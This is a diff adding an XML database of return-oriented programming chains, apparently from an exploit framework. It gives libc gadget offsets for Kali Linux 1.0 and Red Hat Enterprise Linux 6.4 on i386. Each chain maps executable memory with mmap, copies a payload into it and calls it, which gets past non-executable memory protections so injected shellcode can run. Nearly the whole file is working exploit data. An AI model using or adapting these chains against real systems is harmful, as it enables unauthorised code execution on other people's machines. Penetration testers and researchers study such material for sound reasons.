@@ -1,0 +1,143 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+    <rop>
+        <compatibility>
+            <target>Kali Linux 1.0</target>
+        </compatibility>
+
+        <!--
+        dpkg -l libc-* ii  libc-bin 2.13-38 i386 Embedded GNU C Library: Binaries
+        b7533000-b768f000 r-xp 00000000 08:01 1311258    /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+        b7692000-b7693000 rw-p 0015e000 08:01 1311258    /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+        -->
+
+        <gadgets base="0">
+            <gadget offset="0x00001aa6">pop edx</gadget>
+            <gadget value ="0x080c429c">mmap64.plt</gadget>
+            <gadget offset="0x00078b14">xor eax, eax</gadget>
+            <gadget offset="0x0011d795">add eax ecx ; pop ebx ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
+            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
+            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
+            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
+            <gadget offset="0x0002a137">mov [eax], ecx</gadget>
+            <gadget offset="0x00003689">xchg ebp, eax</gadget>
+            <gadget offset="0x00078b14">xor eax, eax</gadget>
+            <gadget offset="0x0011d795">add eax ecx ; pop ebx ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x0006efb0">mov eax [edx] ; mov [ecx] eax ; pop ebp</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x00125ec9">call eax ; pop ebx ; pop ebp</gadget>
+            <gadget value ="0x00000000">addr</gadget>
+            <gadget value ="0x00000800">payload size</gadget>
+            <gadget offset="0x000eb9f7">add esp 0x10 ; pop ebx ; pop ebp ;; (Also flags: PROT_READ | PROT_WRITE | PROT_EXEC)</gadget>
+            <gadget value ="0x00000022">MAP_PRIVATE | MAP_ANON</gadget>
+            <gadget value ="0xffffffff">filedes</gadget>
+            <gadget value ="0x00000000">off_t</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x00103dbe">push esp ; pop ebx ; pop esi ; pop edi ; pop ebp</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x000ab68d">xchg ebx eax ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
+            <gadget offset="0x0007fa9c">add eax 0x8 ;;</gadget>
+            <gadget offset="0x000b0edc">push eax ; xor eax eax ; pop esi ; pop ebp ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x000ab68d">xchg ebx eax ;;</gadget>
+            <gadget offset="0x000c9325">xchg edi eax ;;</gadget>
+            <gadget offset="0x000e2c02">pop ecx ; pop edx ;;</gadget>
+            <gadget value ="0x00000200">payload size (in dwords)</gadget>
+            <gadget value ="0x00000000">garbage</gadget>
+            <gadget offset="0x0007a35c">rep movsd ; xchg edi eax ; mov esi edx ;; </gadget>
+            <gadget offset="0x0002a6eb">pop ecx, pop edx</gadget>
+            <gadget value ="0x00000800">payload size</gadget>
+            <gadget value ="0x00000000">garbage</gadget>
+            <gadget offset="0x00121fd8">sub eax, ecx</gadget>
+            <gadget offset="0x000e2abb">call eax ; pop ebx ; pop ebp ;;</gadget>
+	   </gadgets>
+    </rop>
+
+    <rop>
+        <compatibility>
+            <target>Red Hat Enterprise Linux 6.4</target>
+        </compatibility>
+
+        <!--
+        rpm -qa | grep libc- glibc-2.12-1.107.el6.i686
+        001a1000-00335000 r-xp 00000000 ca:41 14763      /lib/i686/nosegneg/libc-2.12.so
+        00337000-00338000 rw-p 00196000 ca:41 14763      /lib/i686/nosegneg/libc-2.12.so
+        -->
+
+        <gadgets base="0">
+            <gadget offset="0x00001aa6">pop edx</gadget>
+            <gadget value ="0x080b42d4">mmap64</gadget>
+            <gadget offset="0x0007a414">xor eax, eax</gadget>
+            <gadget offset="0x00139aa0">add eax ecx ; pop ebx ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x000e57ca">sub eax, 1</gadget>
+            <gadget offset="0x000e57ca">sub eax, 1</gadget>
+            <gadget offset="0x000e57ca">sub eax, 1</gadget>
+            <gadget offset="0x000e57ca">sub eax, 1</gadget>
+            <gadget offset="0x0002a4e7">mov [eax], ecx</gadget>
+            <gadget offset="0x00003671">xchg ebp, eax</gadget>
+            <gadget offset="0x0007a414">xor eax, eax</gadget>
+            <gadget offset="0x00139aa0">add eax ecx ; pop ebx ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x0006fc30">mov eax [edx] ; mov [ecx] eax ; pop ebp</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x00145519">call eax ; pop ebx ; pop ebp</gadget>
+            <gadget value ="0x00000000">addr</gadget>
+            <gadget value ="0x00000800">payload size</gadget>
+            <gadget offset="0x000a0677">add esp 0x20 ; pop ebx ; pop ebp ;; (Also flags: PROT_READ | PROT_WRITE | PROT_EXEC)</gadget>
+            <gadget value ="0x00000022">MAP_PRIVATE | MAP_ANON</gadget>
+            <gadget value ="0xffffffff">filedes</gadget>
+            <gadget value ="0x00000000">off_t</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x000bc833">push esp ; pop ebx ; pop esi ; pop edi ; pop ebp</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x00168d09">xchg ebx eax ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
+            <gadget offset="0x00081b1c">add eax 0x8 ;;</gadget>
+            <gadget offset="0x000b00cc">push eax ; xor eax eax ; pop esi ; pop ebp ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x00168d09">xchg ebx eax ;;</gadget>
+            <gadget offset="0x0016d283">xchg edi eax ;;</gadget>
+            <gadget offset="0x0002aacb">pop ecx ; pop edx ;;</gadget>
+            <gadget value ="0x00000200">payload size (in dwords)</gadget>
+            <gadget value ="0x00000000">garbage</gadget>
+            <gadget offset="0x0007bd3c">rep movsd ; xchg edi eax ; mov esi edx ;; </gadget>
+            <gadget offset="0x0002aacb">pop ecx ; pop edx ;;</gadget>
+            <gadget value ="0x00000800">payload size</gadget>
+            <gadget value ="0x00000000">garbage</gadget>
+            <gadget offset="0x00141218">sub eax, ecx</gadget>
+            <gadget offset="0x000f59fb">call eax ; pop ebx ; pop ebp ;;</gadget>
+        </gadgets>
+    </rop>
+</db>
